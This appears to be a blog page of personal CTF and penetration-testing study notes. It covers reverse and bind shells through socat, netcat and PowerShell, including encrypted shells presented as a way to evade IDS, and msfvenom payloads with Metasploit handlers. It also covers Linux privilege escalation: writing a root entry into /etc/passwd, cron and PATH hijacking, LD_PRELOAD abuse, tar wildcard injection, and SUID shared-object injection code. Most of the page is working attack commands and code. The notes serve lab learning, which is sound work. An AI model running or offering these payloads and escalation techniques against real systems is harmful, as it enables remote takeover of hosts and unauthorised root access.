<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stty -a</span><br><span class="line">stty rows &lt;number&gt;</span><br><span class="line">stty cols &lt;number&gt;</span><br></pre></td></tr></table></figure>



<h4 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a><strong>Socat</strong></h4><p>Reverse shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes 	//windows</span><br><span class="line">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;           	//linux</span><br></pre></td></tr></table></figure>

<p>Blind Shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes                  	//windows</span><br><span class="line">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes					//linux</span><br></pre></td></tr></table></figure>

<p>Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;port&gt;</span><br><span class="line">socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</span><br></pre></td></tr></table></figure>



<p>Now let’s take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is <em>significantly</em> more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0           </span><br><span class="line">//we are passing in the current TTY as a file and setting the echo to be zero</span><br><span class="line">//same as ctrl+Z then stty raw -echo; fg</span><br></pre></td></tr></table></figure>

<p>The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it’s possible to upload a <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">precompiled socat binary</a>, which can then be executed as normal.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure>



<p>One of the many great things about socat is that it’s capable of creating encrypted shells – both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.</p>
<p>We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:</p>
<p><code>verify=0</code> tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</span><br><span class="line">cat shell.key shell.crt &gt; shell.pem</span><br><span class="line">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</span><br><span class="line"></span><br><span class="line">Blind Shell</span><br><span class="line">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</span><br><span class="line">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</span><br></pre></td></tr></table></figure>

<p>This technique will also work with the special, Linux-only TTY shell covered in the previous task.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0</span><br></pre></td></tr></table></figure>

<p>If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL:10.10.10.5:53,verify=0 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure>



<h4 id="Common-Shell-Payloads"><a href="#Common-Shell-Payloads" class="headerlink" title="Common Shell Payloads"></a><strong>Common Shell Payloads</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">blind shell</span><br><span class="line">mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span><br><span class="line">reverse shell</span><br><span class="line">mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span><br><span class="line"></span><br><span class="line">powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;&lt;ip&gt;&#x27;,&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;      //windows powershell</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
<h4 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a><strong>Msfvenom</strong></h4><p>Msfvenom: the one-stop-shop for all things payload related.</p>
<p> It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. <code>.exe</code>, <code>.aspx</code>, <code>.war</code>, <code>.py</code>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</span><br><span class="line"></span><br><span class="line">eg : </span><br><span class="line">msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</span><br></pre></td></tr></table></figure>

<p>Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</span><br><span class="line">linux/x86/shell_reverse_tcp            	//staged </span><br><span class="line">windows/shell_reverse_tcp				//staged </span><br><span class="line">windows/shell/reverse_tcp				//stageless</span><br><span class="line">windows/x64/meterpreter/reverse_tcp</span><br><span class="line">linux/x86/meterpreter_reverse_tcp</span><br><span class="line">msfvenom --list payloads | grep &quot;linux/x86/meterpreter&quot;</span><br></pre></td></tr></table></figure>



<h4 id="Metasploit-multi-x2F-handler"><a href="#Metasploit-multi-x2F-handler" class="headerlink" title="Metasploit multi&#x2F;handler"></a><strong>Metasploit multi&#x2F;handler</strong></h4><p>Multi&#x2F;Handler is a superb tool for catching reverse shells. It’s essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line">show options</span><br><span class="line">set payload &lt;payload&gt;</span><br><span class="line">set lhosts &lt;listen-address&gt;</span><br><span class="line">set lport &lt;listen-port&gt;</span><br><span class="line">exploit -j     //This tells Metasploit to launch the module, running as a job in the background.</span><br><span class="line">sessions &lt;number&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Common-Linux-Privesc"><a href="#Common-Linux-Privesc" class="headerlink" title="Common Linux Privesc"></a>Common Linux Privesc</h3><p><strong>Where to get LinEnum</strong></p>
<p>You can download a local copy of LinEnum from:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p>
<p>It’s worth keeping this somewhere you’ll remember, because LinEnum is an invaluable tool.</p>
<p><strong>How do I get LinEnum on the target machine?</strong></p>
<p>There are two ways to get LinEnum on the target machine. The first way, is to go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using <strong>“python3 -m http.server 8000”</strong> [1]. Then using <strong>“wget”</strong> on the target machine, and your local IP, you can grab the file from your local machine [2]. Then make the file executable using the command <strong>“chmod +x FILENAME.sh”</strong>.</p>
<p>What is the target’s hostname?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>

<p>Look at the output of &#x2F;etc&#x2F;passwd how many “user[x]” are there on the system?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p>How many available shells are there on the system?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>

<p>What is the name of the bash script that is set to run every 5 minutes by cron?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>

<h4 id="SUID-x2F-GUID"><a href="#SUID-x2F-GUID" class="headerlink" title="SUID&#x2F;GUID"></a><strong>SUID&#x2F;GUID</strong></h4><p><strong>Finding and Exploiting SUID Files</strong></p>
<p>The first step in Linux privilege escalation exploitation is to check for files with the SUID&#x2F;GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner&#x2F;group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p>
<p><strong>What is an SUID binary?</strong></p>
<p>As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read&#x2F;write&#x2F;execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:</p>
<p>r &#x3D; read</p>
<p>w &#x3D; write</p>
<p>x &#x3D; execute</p>
<p>  <strong>user</strong>   <strong>group</strong>   <strong>others</strong></p>
<p>  rwx    rwx    rwx</p>
<p>  <em>421    421    421</em></p>
<p>The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using <strong>“chmod”</strong> as <strong>755</strong>, then it will be: rwxr-xr-x.</p>
<p>But when special permission is given to each user it becomes SUID or SGID. When extra bit <strong>“4”</strong> is set to user(Owner) it becomes <strong>SUID</strong> (Set user ID) and when bit <strong>“2”</strong> is set to group it becomes <strong>SGID</strong> (Set Group ID).</p>
<p>Therefore, the permissions to look for when looking for SUID is:</p>
<p>SUID:</p>
<p>rws-rwx-rwx</p>
<p>GUID:</p>
<p>rwx-rws-rwx</p>
<p><strong>Finding SUID Binaries</strong></p>
<p>We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: <strong>“find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null”</strong> to search the file system for SUID&#x2F;GUID files. Let’s break down this command.</p>
<p><strong>find</strong> - Initiates the “find” command</p>
<p><strong>&#x2F;</strong> - Searches the whole file system</p>
<p><strong>-perm</strong> - searches for files with specific permissions</p>
<p><strong>-u&#x3D;s</strong> - Any of the permission bits <em>mode</em> are set for the file. Symbolic modes are accepted in this form</p>
<p><strong>-type f</strong> - Only search for files</p>
<p><strong>2&gt;&#x2F;dev&#x2F;null</strong> - Suppresses errors</p>
<h4 id="x2F-etc-x2F-passwd"><a href="#x2F-etc-x2F-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a><strong>&#x2F;etc&#x2F;passwd</strong></h4><p><a target="_blank" rel="noopener" href="https://www.myfreax.com/etc-passwd-file/">https://www.myfreax.com/etc-passwd-file/</a></p>
<p>Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: <strong>“openssl passwd -1 -salt [salt] [password]”</strong></p>
<p>What is the hash created by using this command with the salt, <strong>“new”</strong> and the password <strong>“123”</strong>?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1$new$p7ptkEKU1HnaHpRtzNizS1</span><br></pre></td></tr></table></figure>

<p>Great! Now we need to take this value, and create a new root user account. What would the &#x2F;etc&#x2F;passwd entry look like for a root user with the username “new” and the password hash we created before?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>Great! Now you’ve got everything you need. Just add that entry to the end of the &#x2F;etc&#x2F;passwd file!</p>
<h4 id="Escaping-Vi-Editor"><a href="#Escaping-Vi-Editor" class="headerlink" title="Escaping Vi Editor"></a><strong>Escaping Vi Editor</strong></h4><p><strong>Sudo -l</strong></p>
<p>This exploit comes down to how effective our user account enumeration has been. Every time you have access to an account during a CTF scenario, you should use <strong>“sudo -l”</strong> to list what commands you’re able to use as a super user on that account. Sometimes, like this, you’ll find that you’re able to run certain commands as a root user without the root password. This can enable you to escalate privileges.</p>
<p><strong>Escaping Vi</strong></p>
<p>Running this command on the “user8” account shows us that this user can run vi with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user!</p>
<p>**Misconfigured Binaries and GTFOBins<br>**</p>
<p>If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can access, a good place to look up how to exploit them is GTFOBins. GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p>Let’s use the <strong>“sudo -l”</strong> command, what does this user require (or not require) to run vi as root?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>So, all we need to do is open vi as root, by typing <strong>“sudo vi”</strong> into the terminal.</p>
<p>Now, type <strong>“:!sh”</strong> to open a shell!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vim</span><br><span class="line">!sh</span><br><span class="line">//sudo vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="Crontab"><a href="#Crontab" class="headerlink" title="Crontab"></a><strong>Crontab</strong></h4><p><strong>How to view what Cronjobs are active.</strong></p>
<p>We can use the command <strong>“cat &#x2F;etc&#x2F;crontab”</strong> to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn’t find anything.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R</span><br><span class="line">echo [MSFVENOM OUTPUT] &gt; autoscript.sh</span><br><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!</p>
<h4 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a><strong>PATH</strong></h4><p><strong>What is PATH?</strong></p>
<p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.</p>
<p>It is very simple to view the Path of the relevant user with help of the command <strong>“echo $PATH”</strong>.</p>
<p><strong>How does this let us escalate privileges?</strong></p>
<p>Let’s say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with “ps”. Unlike in our previous SUID example, in this situation we can’t exploit it by supplying an argument for command injection, so what can we do to try and exploit this?</p>
<p>We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we’ve written instead!</p>
<p>As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd ~     			//find scsript</span><br><span class="line">//it likes command &quot;ls&quot;</span><br><span class="line">cd /tmp/</span><br><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd ~</span><br><span class="line">ls</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>Once you’ve finished the exploit, you can exit out of root and use **”export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:$PATH”**to reset the PATH variable back to default, letting you use <strong>“ls”</strong> again!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH&quot;</span><br></pre></td></tr></table></figure>



<p>Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</a></li>
<li>[<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md]">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md]</a>(<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources&#x2F;Linux - Privilege Escalation.md)</li>
<li><a target="_blank" rel="noopener" href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html</a></li>
<li><a target="_blank" rel="noopener" href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a></li>
</ul>
<h3 id="Linux-PrivEsc"><a href="#Linux-PrivEsc" class="headerlink" title="Linux PrivEsc ***"></a>Linux PrivEsc ***</h3><p><strong>UDF</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">https://www.freebuf.com/articles/database/291175.html</a></p>
<p><strong>&#x2F;etc&#x2F;shadow</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/shadow</span><br><span class="line">mkpasswd -m sha-512 newpasswordhere</span><br><span class="line">vim /etc/shadow</span><br></pre></td></tr></table></figure>

<p><strong>&#x2F;etc&#x2F;passwd</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/passwd</span><br><span class="line">openssl passwd newpasswordhere</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>

<p><strong>sudo</strong></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><strong>Sudo - Environment Variables</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.boiteaklou.fr/Abusing-Shared-Libraries.html">https://www.boiteaklou.fr/Abusing-Shared-Libraries.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for user on this host:</span><br><span class="line">    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure>

<p>LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user’s environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</span><br><span class="line">sudo LD_PRELOAD=/tmp/preload.so program-name-here</span><br><span class="line">sudo LD_PRELOAD=/tmp/preload.so vim</span><br></pre></td></tr></table></figure>



<p>Run ldd against the apache2 program file to see which shared libraries are used by the program:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd /usr/sbin/apache2</span><br></pre></td></tr></table></figure>

<p>Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at &#x2F;home&#x2F;user&#x2F;tools&#x2F;sudo&#x2F;library_path.c:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</span><br></pre></td></tr></table></figure>

<p>Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to &#x2F;tmp (where we output the compiled shared object):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_LIBRARY_PATH=/tmp </span><br><span class="line">apache2</span><br></pre></td></tr></table></figure>



<p><strong>Cron-</strong>*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">locate overwrite.sh</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cp /bin/bash /tmp/rootbash</span><br><span class="line">chmod +xs /tmp/rootbash</span><br></pre></td></tr></table></figure>



<p>We can see that the code periodically is making a backup of the entire “&#x2F;home&#x2F;user” folder. The important point to note here is the * that is used to represent any file. This can be exploited if not used correctly.</p>
<p>We can make files that have the same name as the options (flags) that are provided by the tar utility and tar will consider these files as options not as file names.</p>
<p>Lets create an payload using “msfvenom” that we will make the tar utility execute which should give us an reverse shell.</p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221202214838446.png" alt="image-20221202214838446"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/local/bin/compress.sh</span><br><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</span><br><span class="line">chmod +x /home/user/shell.elf</span><br><span class="line">touch /home/user/--checkpoint=1</span><br><span class="line">touch /home/user/--checkpoint-action=exec=shell.elf</span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/tar/">https://gtfobins.github.io/gtfobins/tar/</a></p>
<p><strong>SUID&#x2F;SGID</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3</span><br></pre></td></tr></table></figure>

<p>Note that &#x2F;usr&#x2F;sbin&#x2F;exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit-DB</a>, Google, and GitHub are good places to search!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/user/tools/suid/exim/cve-2016-1531.sh</span><br></pre></td></tr></table></figure>



<p>The executable <code>/usr/local/bin/suid-so</code> is vulnerable to shared object injection. Lets see this attack in action. First lets run the executable and see what it does. We see that it prints an progress bar on the terminal.</p>
<p>Lets use the strace command (Stack Trace) on the executable to see all libraries and files where accessed by the executable.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/suid-so</span><br><span class="line">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</span><br></pre></td></tr></table></figure>

<p>We can see that the executable depends on an library file called “libcalc.so” that should be present in the user directory.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span><br></pre></td></tr></table></figure>

<p>We add code into that file that will set the UID to 0 (root) and then spawn an privileges shell. Lets compile this file and see if running the executable will cause our library to be loaded which in turn will spawn a root shell.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /home/user/.config</span><br><span class="line">gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</span><br><span class="line">/usr/local/bin/suid-so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">void inject() &#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>The <strong>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env</strong> executable can be exploited due to it inheriting the user’s PATH environment variable and attempting to execute programs without specifying an absolute path.</p>
